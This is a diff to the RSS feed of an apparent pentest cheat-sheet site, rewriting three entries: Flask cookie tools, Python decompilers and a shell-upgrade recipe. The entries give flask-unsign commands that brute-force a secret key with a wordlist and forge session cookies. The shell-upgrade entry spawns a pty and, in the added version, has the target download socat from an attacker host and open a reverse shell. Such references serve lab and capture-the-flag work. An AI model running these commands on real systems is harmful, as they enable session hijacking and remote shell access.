@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/flask_cookie/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/flask_cookie/</guid>
-      <description> flask-unsign pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
+      <description> Cookie Tools flask-unsign # Install pip3 install flask-unsign # Decode flask cookie flask-unsign --decode --cookie &amp;lt;COOKIE&amp;gt; # Brute force secret key flask-unsign --unsign --cookie &amp;lt;COOKIE&amp;gt; -w /usr/share/wordlists/rockyou.txt --no-literal-eval # Forge flask cookie flask-unsign --sign --cookie &amp;lt;COOKIE_DATA&amp;gt; --secret &amp;lt;SECRET&amp;gt; </description>
     </item>
     <item>
       <title>Forward Shell</title>
@@ -40,7 +40,7 @@
       <link>https://tldrbins.github.io/python_decompile/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/python_decompile/</guid>
-      <description> pyinstxtractor # Unpack pyinstaller packed binary pyinstxtractor test.elf uncompyle6 # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 script.pyc pycdc Installation pycdc&#xA;git clone https://github.com/zrax/pycdc.git cd pycdc cmake . make make check Run ./pycdc script.pyc </description>
+      <description>Tools pyinstxtractor uncompyle6 pycdc # Unpack pyinstaller packed binary pyinstxtractor test.elf # Install pip3 install uncompyle6 # Run (need .pyc extension) uncompyle6 script.pyc # Install git clone https://github.com/zrax/pycdc.git cd pycdc cmake . make make check # Run ./pycdc script.pyc Ref: pycdc</description>
     </item>
     <item>
       <title>Retrieve Flask Debug Pin</title>
@@ -54,7 +54,7 @@
       <link>https://tldrbins.github.io/upgrade_shell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/upgrade_shell/</guid>
-      <description>Upgrade Shell Check installed binary which sh which bash which python3 which python python python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color socat Download socat&#xA;# Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.</description>
+      <description>Upgrade Shell Check installed binaries which sh which bash which python3 which python python socat script python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # Ctrl-Z to send the process to background, then stty raw -echo; fg # After fg, press enter again, then export TERM=xterm-256color # Start a local http server python3 -m http.server 80 # In our local Linux machine socat file:`tty`,raw,echo=0 tcp-listen:1337 # In target machine wget -q http://10.10.14.10/socat -O /tmp/socat &amp;amp;&amp;amp; chmod +x /tmp/socat &amp;amp;&amp;amp; /tmp/socat exec:&amp;#39;bash -li&amp;#39;,pty,stderr,setsid,sigint,sane tcp:10.</description>
     </item>
   </channel>
 </rss>
